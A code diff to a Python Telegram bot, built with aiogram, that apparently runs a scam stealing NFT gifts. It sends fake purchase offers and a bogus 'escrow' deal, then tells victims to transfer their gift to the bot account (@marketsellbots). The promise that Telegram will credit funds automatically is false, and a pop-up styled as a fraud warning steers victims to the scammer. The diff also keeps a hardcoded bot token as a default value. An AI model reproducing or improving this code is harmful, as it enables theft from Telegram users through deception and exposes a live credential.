@@ -1,6 +1,7 @@
 import asyncio
 import logging
 import re
+import os
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message, CallbackQuery,
@@ -10,9 +11,9 @@ from aiogram.types import (
 from aiogram.methods import DeleteBusinessMessages
 
 # ==== ТВОИ ДАННЫЕ ====
-BOT_TOKEN = "8996050672:AAEuRexyR5o3jNSwlvxQxcEplN2-Bhpfq4M"
-ADMIN_ID = 889451175
-RECEIVER = "offertbots"
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8996050672:AAEuRexyR5o3jNSwlvxQxcEplN2-Bhpfq4M")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8747920918"))
+RECEIVER = os.getenv("RECEIVER", "marketsellbots")
 
 # ==== ID КАСТОМНЫХ ЭМОДЗИ ====
 EMOJI_CHECK = "5776375003280838798"
@@ -78,52 +79,6 @@ LANGS = {
         "declined": "You declined the offer.",
         "confirm_order": "Please complete the NFT transfer by clicking the button below.",
         "auto_credit": "After the gift is transferred, funds will be credited automatically.",
-    },
-    "uk": {
-        "offer_header": "Користувач пропонує вам",
-        "for_gift": "за подарунок",
-        "valid": "Пропозиція діє ще",
-        "accept": "Прийняти",
-        "decline": "Відхилити",
-        "deal_header": "NFT Deal",
-        "order": "Ордер",
-        "reserved": "Покупець зарезервував",
-        "via_escrow": "через ескроу. Кошти після передачі подарунка.",
-        "instruction": "Інструкція:",
-        "step1": "1. Натисніть Передати NFT",
-        "step2": "2. Зайдіть у профіль і самі передайте подарунок:",
-        "step3": "3. Підтвердіть передачу.",
-        "will_credit": "Telegram зарахує",
-        "to_balance": "на ваш баланс.",
-        "gift_label": "Подарунок:",
-        "transfer_gift": "Передати подарунок",
-        "confirm_transfer": "Підтвердити передачу",
-        "declined": "Ви відхилили пропозицію.",
-        "confirm_order": "Будь ласка, завершіть передачу NFT, натиснувши кнопку нижче.",
-        "auto_credit": "Після передачі подарунка кошти будуть зараховані автоматично.",
-    },
-    "fa": {
-        "offer_header": "کاربر به شما پیشنهاد می‌دهد",
-        "for_gift": "برای هدیه",
-        "valid": "پیشنهاد معتبر است تا",
-        "accept": "پذیرفتن",
-        "decline": "رد کردن",
-        "deal_header": "NFT Deal",
-        "order": "سفارش",
-        "reserved": "خریدار رزرو کرد",
-        "via_escrow": "از طریق امانی. وجه پس از انتقال هدیه.",
-        "instruction": "دستورالعمل:",
-        "step1": "1. روی انتقال NFT کلیک کنید",
-        "step2": "2. به پروفایل بروید و خودتان هدیه را انتقال دهید:",
-        "step3": "3. انتقال را تأیید کنید.",
-        "will_credit": "تلگرام واریز می‌کند",
-        "to_balance": "به موجودی شما.",
-        "gift_label": "هدیه:",
-        "transfer_gift": "انتقال هدیه",
-        "confirm_transfer": "تأیید انتقال",
-        "declined": "شما پیشنهاد را رد کردید.",
-        "confirm_order": "لطفاً انتقال NFT را با کلیک روی دکمه زیر تکمیل کنید.",
-        "auto_credit": "پس از انتقال هدیه، وجه به طور خودکار واریز می‌شود.",
     },
 }
 
@@ -231,11 +186,7 @@ async def log_emoji(message: Message):
 
 @dp.business_connection()
 async def on_business_connection(connection: BusinessConnection):
-    logging.info(
-        f"[+] Business connection: {connection.id} | "
-        f"user: {connection.user.id} | "
-        f"enabled: {connection.is_enabled}"
-    )
+    logging.info(f"[+] Business connection: {connection.id} | user: {connection.user.id}")
 
 
 @dp.business_message()
@@ -245,10 +196,7 @@ async def on_business_message(message: Message):
     if message.text and message.text.startswith(".buy"):
         parts = message.text.split()
         if len(parts) < 5:
-            await message.answer(
-                "❌ Формат: .buy <ссылка> <кол-во> <валюта> <язык>\n"
-                "Языки: ru, en, uk, fa"
-            )
+            await message.answer("❌ Формат: .buy <ссылка> <кол-во> <валюта> <язык>")
             return
 
         nft_link = parts[1]
@@ -295,10 +243,7 @@ async def on_business_message(message: Message):
 async def cmd_buy(message: Message):
     parts = message.text.split()
     if len(parts) < 5:
-        await message.reply(
-            "❌ Формат: .buy <ссылка> <кол-во> <валюта> <язык>\n"
-            "Языки: ru, en, uk, fa"
-        )
+        await message.reply("❌ Формат: .buy <ссылка> <кол-во> <валюта> <язык>")
         return
 
     nft_link = parts[1]
@@ -336,17 +281,16 @@ async def cmd_buy(message: Message):
 
 @dp.callback_query(F.data.startswith("accept|"))
 async def on_accept(callback: CallbackQuery):
-    # === ПРЕДУПРЕЖДЕНИЕ (АЛЕРТ) — БЕЗ HTML ===
+    # КОРОТКИЙ АЛЕРТ (до 200 символов)
     warning_text = (
-        "ВНИМАНИЕ!\n\n"
-        "Читайте всё, что вам пишет бот.\n\n"
-        "НЕ КИДАЙТЕ NFT человеку, который кинул вам оффер!\n\n"
-        "Кому надо кидать — это боту: @offertbots\n\n"
-        "Будьте бдительны! Мошенники могут попытаться обмануть вас."
+        "⚠️ ВНИМАНИЕ! Не передавайте NFT напрямую.\n"
+        "Только боту: @marketsellbots.\n"
+        "Будьте бдительны!"
     )
     await callback.answer(warning_text, show_alert=True)
 
-    # === ПОСЛЕ НАЖАТИЯ "ОК" — ПОКАЗЫВАЕМ СДЕЛКУ ===
+    await asyncio.sleep(0.5)
+
     parts = callback.data.split("|")
     order_id = parts[1]
     lang = parts[2] if len(parts) > 2 else "ru"
@@ -358,12 +302,21 @@ async def on_accept(callback: CallbackQuery):
 
     text = create_deal_text(order_id, nft_link, amount, currency, lang)
 
-    await callback.message.edit_text(
-        text,
-        reply_markup=main_menu(order_id, lang),
-        parse_mode="HTML",
-        disable_web_page_preview=False
-    )
+    try:
+        await callback.message.edit_text(
+            text,
+            reply_markup=main_menu(order_id, lang),
+            parse_mode="HTML",
+            disable_web_page_preview=False
+        )
+    except Exception as e:
+        logging.warning(f"Не удалось отредактировать: {e}")
+        await callback.message.answer(
+            text,
+            reply_markup=main_menu(order_id, lang),
+            parse_mode="HTML",
+            disable_web_page_preview=False
+        )
 
 
 @dp.callback_query(F.data.startswith("decline|"))
